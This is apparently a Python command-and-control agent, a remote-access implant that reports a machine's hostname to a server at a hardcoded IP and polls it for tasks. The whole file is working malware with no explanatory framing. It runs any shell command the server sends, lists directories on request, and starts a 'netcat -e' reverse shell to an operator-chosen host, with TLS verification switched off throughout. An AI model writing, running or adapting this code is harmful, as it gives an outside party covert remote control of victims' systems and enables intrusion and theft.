import subprocess as sp
import threading
import time

import requests as r
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
HOST = "192.168.178.107"
PORT = 10000
SERVICE = "https"
URL = f"{SERVICE}://{HOST}:{PORT}"


def reverse_shell(address: int, port: int, binary: str):
    sp.getoutput(f"netcat -e {binary} {address} {port}")

data = {
    "address": "192.168.178.107",
    "hostname": sp.getoutput("hostname")
}
name = r.post(f"{URL}/connect", json=data, verify=False).text

while True:
    time.sleep(5)
    try:
        tasks = r.get(URL + "/tasks/" + name, verify=False)
    except:
        continue
    print(tasks.status_code)
    tasks = tasks.json()
    for task in tasks:
        if task["type"] in ["rce", "dir", "reverse-shell"]:
            data = {
                "id": task["id"],
                "success": True
            }
            if task["type"] == "rce":
                data["output"] = sp.getoutput(task["args"]["cmd"])
            elif task["type"] == "dir":
                data["output"] = sp.getoutput("ls " + task["args"]["dir"])
            elif task["type"] == "reverse-shell": 
                threading.Thread(target=reverse_shell, kwargs={"address":task['args']["address"], "port":task['args']["port"], "binary": task['args']["binary"]}).start()
                data["output"] = "Send reverse shell"
            res = r.post(URL + "/finish/" + name, json=data, verify=False)

            

        